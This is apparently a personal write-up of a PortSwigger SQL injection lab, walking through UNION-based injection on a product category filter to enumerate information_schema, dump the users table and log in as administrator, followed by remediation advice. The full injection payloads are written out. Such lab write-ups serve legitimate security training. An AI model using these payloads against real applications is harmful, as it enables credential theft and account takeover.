# SQL Injection — Listing the Database Contents on Non-Oracle Databases

[Lab URL](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

## Objective

This lab contains a SQL injection vulnerability in the product category filter.

The query results are returned in the application's response, allowing a UNION attack to retrieve data from other database tables.

The application contains a login function, and the database contains a table storing usernames and passwords.

The objective is to:

1. Determine the name of the table containing the user data.
2. Determine the names of its columns.
3. Retrieve the usernames and passwords.
4. Use the recovered credentials to log in as the `administrator` user.

---

## Initial Reconnaissance

I observed that the application uses a product category filter vulnerable to SQL injection.

The requests were sent using the HTTP `GET` method.

I used Burp Suite to intercept and modify the requests while testing different SQL injection techniques.

---

## Interesting Parameter

```text id="l6x6xc"
/filter?category=<ProductCategory>
```

**Method:** `GET`

The `category` parameter was used for SQL injection testing.

---

## Testing

I first confirmed the UNION query structure and determined that the application accepted **2 columns**.

### 1. Determine the Number of Columns

I tested:

```sql id="t6p09c"
' UNION SELECT NULL,NULL--
```

The application accepted the two-column UNION query.

---

### 2. Test String-Compatible Columns

I then tested whether the columns accepted string values:

```sql id="eyx2r3"
' UNION SELECT 'A',NULL--
```

and:

```sql id="b9iz67"
' UNION SELECT 'A','b'--
```

This confirmed that the required columns could return string data.

---

## Database Enumeration

After confirming the UNION structure, I used the `information_schema` database metadata to enumerate tables.

### 3. Retrieve Table Names

I queried:

```sql id="8s0bci"
' UNION SELECT table_name,NULL
FROM information_schema.tables--
```

This allowed me to identify the tables available in the database.

I identified the target user table:

```text id="h8sn3p"
users_kgxepg
```

---

### 4. Retrieve Column Names

I then queried the column metadata:

```sql id="1v4ry7"
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users_kgxepg'--
```

The query revealed two relevant columns:

```text id="p8c6cs"
username_gvzpht
password_bgtirg
```

---

## Exploitation

After identifying the table and column names, I queried the user table:

```sql id="r5b1dw"
' UNION SELECT username_gvzpht,password_bgtirg
FROM users_kgxepg--
```

The application returned the contents of the table.

---

## Observation

The application returned the following lab users:

| Username        | Password           |
| --------------- | ------------------ |
| `administrator` | `[lab credential]` |
| `carlos`        | `[lab credential]` |
| `wiener`        | `[lab credential]` |

> **Note:** These credentials belong to the PortSwigger lab environment and should be treated as disposable lab credentials.

I identified the `administrator` credentials and used them to log in successfully.

The lab was solved.

---

## Vulnerability

The `category` parameter is vulnerable to **SQL Injection**.

The application allows user-controlled input to influence the SQL query, making it possible to execute UNION queries and access database metadata and data from other tables.

---

## Why It Worked

The vulnerability allowed the injected SQL query to be executed as part of the application's database query.

After determining that the UNION query required two columns, I used the database's metadata tables to enumerate its structure.

The attack progressed through:

```text id="7rc9m6"
UNION SELECT
      ↓
Determine column count
      ↓
information_schema.tables
      ↓
Identify table
      ↓
information_schema.columns
      ↓
Identify columns
      ↓
Query target table
      ↓
Retrieve credentials
```

`information_schema.tables` provided information about available tables, while `information_schema.columns` provided information about columns belonging to those tables.

This allowed me to discover the randomly named user table and its username/password columns.

---

## Impact

The demonstrated impact was significant:

* Database structure enumeration.
* Disclosure of table names.
* Disclosure of column names.
* Unauthorized access to the users table.
* Disclosure of usernames and passwords.
* Recovery of administrator credentials.
* Authentication as the administrator account.

In a real application, this type of SQL injection could potentially result in extensive database disclosure and account compromise.

---

## Remediation

The primary defense against SQL injection is to use **parameterized queries / prepared statements**.

Developers should also:

* Use prepared statements for database queries.
* Apply least-privilege permissions to database accounts.
* Restrict database account access to only required tables and operations.
* Avoid exposing database errors or query results.
* Store passwords using strong password hashing rather than plaintext.
* Validate user input appropriately.
* Perform regular security testing against database-facing parameters.

Input filtering alone should not be relied upon as the primary SQL injection defense.

---

## Tools

* Burp Suite
* Burp Repeater
* Web Browser

---

## Lessons Learned

* How UNION-based SQL injection can be used to enumerate database structure.
* How `information_schema.tables` can reveal table names.
* How `information_schema.columns` can reveal column names.
* How to identify a randomly named database table.
* How to retrieve data after discovering the table and column structure.
* How SQL injection can progress from query manipulation to credential disclosure.
* How credential disclosure can lead to administrator account compromise.

---

## Key Takeaway

This lab demonstrated a complete database enumeration workflow using SQL injection:

```text id="w8j8wl"
Find injection point
        ↓
Determine column count
        ↓
Test data types
        ↓
Enumerate tables
        ↓
Enumerate columns
        ↓
Identify target table
        ↓
Retrieve target data
        ↓
Recover administrator credentials
        ↓
Authenticate as administrator
```

The main lesson was that understanding the **database structure** is an important part of a UNION-based SQL injection attack. Once the table and column names were identified, the required user data could be retrieved.
